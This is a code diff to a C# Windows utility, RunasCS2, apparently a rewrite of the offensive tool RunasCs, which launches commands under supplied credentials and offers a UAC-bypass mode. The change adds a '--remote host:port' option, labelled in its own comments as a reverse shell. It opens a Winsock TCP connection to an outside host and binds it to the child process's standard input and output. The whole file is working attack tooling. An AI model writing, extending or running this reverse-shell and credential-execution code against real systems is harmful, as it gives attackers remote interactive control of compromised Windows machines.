@@ -23,6 +23,9 @@
 //         "cmd /c echo `"A B`"" as "cmd /c echo "A B"" (inner quotes not
 //         escaped), so the CRT-split args[2] became "cmd /c echo A".
 //
+//   Fix6: -r / --remote <host:port> redirects stdin/stdout/stderr to a TCP
+//         socket (reverse shell), as in the original RunasCs. Does not wait.
+//
 // Build (Linux / Mono):
 //   mcs -out:RunasCS2.exe RunasCS2.cs
 // Build (Windows .NET Framework):
@@ -31,6 +34,7 @@
 // Usage:
 //   RunasCS2.exe <username> <password> <command>
 //                [--domain <domain>] [--logon-type <2|3|8|9>] [--bypass-uac]
+//                [-r|--remote <host:port>]
 
 using System;
 using System.Collections.Generic;
@@ -113,6 +117,21 @@ class RunasCS2
     [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
     static extern IntPtr GetCommandLineW();
 
+    // Fix6: Winsock (dwFlags=0 で非 overlapped ソケットを標準ハンドルとして使う)
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    static extern int WSAStartup(ushort wVersionRequested, byte[] lpWSAData);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    static extern IntPtr WSASocketW(
+        int af, int type, int protocol,
+        IntPtr lpProtocolInfo, uint g, uint dwFlags);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    static extern int connect(IntPtr s, byte[] name, int namelen);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    static extern int closesocket(IntPtr s);
+
     // ── Structs ─────────────────────────────────────────────────────────────
 
     [StructLayout(LayoutKind.Sequential)]
@@ -165,6 +184,11 @@ class RunasCS2
     const int  TokenPrimary          = 1;
     const int  TokenImpersonation    = 2;
 
+    // Fix6: Winsock
+    const int AF_INET     = 2;
+    const int SOCK_STREAM = 1;
+    const int IPPROTO_TCP = 6;
+
     // ── Entry point ─────────────────────────────────────────────────────────
 
     static int Main(string[] args)
@@ -179,6 +203,7 @@ class RunasCS2
             Console.Error.WriteLine("  --logon-type 8  : NetworkCleartext (LogonUser + CreateProcessAsUser)");
             Console.Error.WriteLine("  --logon-type 9  : NewCredentials (CreateProcessWithLogonW /netonly)");
             Console.Error.WriteLine("  --bypass-uac    : CreateProcessWithTokenW (requires SeImpersonatePrivilege)");
+            Console.Error.WriteLine("  -r, --remote <host:port> : Redirect stdin/stdout/stderr to a remote host (no wait)");
             return 1;
         }
 
@@ -187,6 +212,7 @@ class RunasCS2
         string domain     = ".";
         int    logonType  = 0;         // 0 = use CreateProcessWithLogonW (デフォルト)
         bool   bypassUac  = false;
+        string remote     = null;
 
         // Fix5: コマンドは args[] ではなく生のコマンドラインから切り出す。
         // Windows PowerShell 5.1 は "cmd /c echo `"A B`"" を
@@ -212,6 +238,8 @@ class RunasCS2
                 logonType = int.Parse(tokens[++i].Value);
             else if (a == "--bypass-uac")
                 bypassUac = true;
+            else if (a == "-r" || a == "--remote")
+                remote = tokens[++i].Value;
         }
 
         if (username.Contains("\\"))
@@ -221,29 +249,38 @@ class RunasCS2
             username = parts[1];
         }
 
-        // ── パイプ作成 ───────────────────────────────────────────────────────
-
-        var sa = new SECURITY_ATTRIBUTES
-        {
-            nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)),
-            bInheritHandle = true,
-            lpSecurityDescriptor = IntPtr.Zero
-        };
-
-        IntPtr hRead, hWrite;
-        if (!CreatePipe(out hRead, out hWrite, ref sa, 0))
-            return Die("CreatePipe");
-
-        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+        // ── 標準ハンドル: リモートソケット or パイプ ─────────────────────────
 
         var si = new STARTUPINFO
         {
-            cb         = Marshal.SizeOf(typeof(STARTUPINFO)),
-            dwFlags    = STARTF_USESTDHANDLES,
-            hStdInput  = IntPtr.Zero,
-            hStdOutput = hWrite,
-            hStdError  = hWrite
+            cb      = Marshal.SizeOf(typeof(STARTUPINFO)),
+            dwFlags = STARTF_USESTDHANDLES
         };
+
+        IntPtr hRead = IntPtr.Zero, hWrite = IntPtr.Zero, hSock = IntPtr.Zero;
+
+        if (remote != null)
+        {
+            hSock = ConnectRemote(remote);
+            if (hSock == IntPtr.Zero) return 1;
+            si.hStdInput = si.hStdOutput = si.hStdError = hSock;
+        }
+        else
+        {
+            var sa = new SECURITY_ATTRIBUTES
+            {
+                nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)),
+                bInheritHandle = true,
+                lpSecurityDescriptor = IntPtr.Zero
+            };
+
+            if (!CreatePipe(out hRead, out hWrite, ref sa, 0))
+                return Die("CreatePipe");
+
+            SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+            si.hStdOutput = hWrite;
+            si.hStdError  = hWrite;
+        }
 
         var cmdSb = new StringBuilder(command);  // Fix1: verbatim
 
@@ -281,20 +318,26 @@ class RunasCS2
                 CREATE_NO_WINDOW, IntPtr.Zero, null,
                 ref si, out pi);
 
-            if (!ok)
-            {
-                CloseHandle(hWrite);
-                CloseHandle(hRead);
-                return Die("CreateProcessWithLogonW");
-            }
+            if (!ok) Die("CreateProcessWithLogonW");
         }
 
-        CloseHandle(hWrite);
+        if (hWrite != IntPtr.Zero) CloseHandle(hWrite);
+        if (hSock  != IntPtr.Zero) closesocket(hSock);
 
         if (!ok)
         {
-            CloseHandle(hRead);
+            if (hRead != IntPtr.Zero) CloseHandle(hRead);
             return 1;
+        }
+
+        // ── Fix6: リモートモードは待たずに終了 ──────────────────────────────
+
+        if (remote != null)
+        {
+            Console.Error.WriteLine("[+] Process {0} started, stdio redirected to {1}", pi.dwProcessId, remote);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return 0;
         }
 
         // ── Fix2: ストリームループで出力を無制限に読む ───────────────────────
@@ -485,7 +528,7 @@ class RunasCS2
             string a = tokens[i].Value;
             if (a == "--bypass-uac")
                 continue;
-            if (a == "--domain" && i + 1 < tokens.Count)
+            if ((a == "--domain" || a == "-r" || a == "--remote") && i + 1 < tokens.Count)
                 i++;
             else if (a == "--logon-type" && i + 1 < tokens.Count
                      && int.TryParse(tokens[i + 1].Value, out dummy))
@@ -519,6 +562,66 @@ class RunasCS2
 
         // 複数トークン (外側の引用符なしで書かれたコマンド) → 生文字列をそのまま
         return raw;
+    }
+
+    // ── Fix6: リモートホストへ TCP 接続 ──────────────────────────────────────
+
+    static IntPtr ConnectRemote(string remote)
+    {
+        int colon = remote.LastIndexOf(':');
+        ushort port;
+        if (colon <= 0 || !ushort.TryParse(remote.Substring(colon + 1), out port) || port == 0)
+        {
+            Console.Error.WriteLine("[-] --remote: expected <host:port>.");
+            return IntPtr.Zero;
+        }
+        string host = remote.Substring(0, colon);
+
+        System.Net.IPAddress ip = null;
+        try
+        {
+            foreach (var a in System.Net.Dns.GetHostAddresses(host))
+                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) { ip = a; break; }
+        }
+        catch (Exception e)
+        {
+            Console.Error.WriteLine("[-] --remote: cannot resolve {0}: {1}", host, e.Message);
+            return IntPtr.Zero;
+        }
+        if (ip == null)
+        {
+            Console.Error.WriteLine("[-] --remote: no IPv4 address for {0}.", host);
+            return IntPtr.Zero;
+        }
+
+        if (WSAStartup(0x0202, new byte[512]) != 0)
+        {
+            Die("WSAStartup");
+            return IntPtr.Zero;
+        }
+
+        // dwFlags = 0: 非 overlapped ソケットでないと子プロセスの標準ハンドルとして使えない
+        IntPtr s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, IntPtr.Zero, 0, 0);
+        if (s == new IntPtr(-1))
+        {
+            Die("WSASocket");
+            return IntPtr.Zero;
+        }
+
+        // sockaddr_in: family(2) | port(2, big-endian) | addr(4) | zero(8)
+        byte[] sin = new byte[16];
+        sin[0] = (byte)AF_INET;
+        sin[2] = (byte)(port >> 8);
+        sin[3] = (byte)port;
+        Buffer.BlockCopy(ip.GetAddressBytes(), 0, sin, 4, 4);
+
+        if (connect(s, sin, sin.Length) != 0)
+        {
+            Die(string.Format("connect({0}:{1})", ip, port));
+            closesocket(s);
+            return IntPtr.Zero;
+        }
+        return s;
     }
 
     // ────────────────────────────────────────────────────────────────────────
